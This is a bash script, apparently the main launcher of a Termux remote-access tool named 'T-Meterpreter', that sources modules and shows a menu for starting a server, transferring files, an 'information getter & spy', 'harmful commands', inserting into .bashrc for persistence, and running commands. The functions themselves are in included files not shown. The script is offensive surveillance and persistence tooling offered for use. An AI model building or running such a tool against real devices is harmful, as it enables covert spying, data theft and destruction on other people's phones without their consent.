#!/bin/bash
#Dependences: netcat-openbsd, termux-api, neofetch, figlet, iproute2, openssh

RED='\033[31;1m'
GREEN='\033[32;1m'
BLUE='\033[34;1m'
YELLOW='\033[33;1m'
RED_BLINK='\033[31;5;1m'
END='\033[m'

for module in ./include/*;
  do source $module
done

echo -e $YELLOW
figlet T-Meterpreter
echo -e $BLUE
echo " # Termux Meterpreter [v1.0]"
echo
echo -e " [ Coded by   : xRev3rse_                 ]"
echo -e " [ My website : raonyomiran.netlify.app   ]"
echo -e " [ Sawt       : discord.gg/YgS4AHPMSU     ]"


while true
do
	echo -e $END
	echo -e " Uptime       :" $(uptime -p)
	echo -e " Local IP     :" #$(ip route get 8.8.8.8 | cut -d ' ' -f 7)
	echo -e " Public IP    :" #$(curl -s ifconfig.me)
	echo -e " Current Dir  :" $(pwd)
	echo -e " Current User :" $(whoami)

	echo
	echo " [1] Up server                "
	echo " [2] File transfer            "
	echo " [3] Information getter & spy "
	echo " [4] Harmful commands         "
	echo " [5] Insert on .bashsrc       "
	echo " [6] Command runner"
	read -p " [?] Option: " input

	if [[ "$input" == 1 ]]; then
		open_server
	elif [[ "$input" == 2 ]]; then
                file_transfer
	elif [[ "$input" == 3 ]]; then
		information_getter
	elif [[ "$input" == 4 ]]; then
		destructive_main
	elif [[ "$input" == 5 ]]; then
		insert_bashrc
	elif [[ "$input" == 6 ]]; then
		run_command
	fi
done
